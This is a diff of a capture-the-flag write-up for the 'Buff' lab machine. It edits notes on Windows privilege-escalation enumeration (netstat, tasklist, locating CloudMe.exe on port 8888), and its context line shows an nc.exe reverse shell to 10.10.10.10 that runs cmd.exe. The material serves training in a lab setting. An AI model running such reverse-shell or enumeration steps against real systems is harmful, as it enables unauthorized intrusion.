@@ -34,14 +34,14 @@ C:\xampp\htdocs\gym\upload> C:\ProgramData\nc.exe 10.10.10.10 443 -e cmd.exe
 
 ### Privilege Escalation
 
-Manual enumeration was very important for Buff, using `netstat -ano | findstr TCP | findstr "127.0.0.1"` we 
+Manual enumeration was very important for Buff, using `netstat -ano | findstr TCP | findstr ":0` we 
 can see that a process is listening on port 3306 and on port 8888 (only appears intermittently!) locally
 
 Find the executable listening on the port (not reliable, the PID changes very quickly)
 
 `tasklist /v | findstr <PID>`
 
-Port 3306 is mysql for XAmpp, but 8888 is CloudMe.exe
+Port 3306 is mysql for XAmpp likely the user database for the website, but 8888 is CloudMe.exe
 
 Search C:\ for CloudMe
 
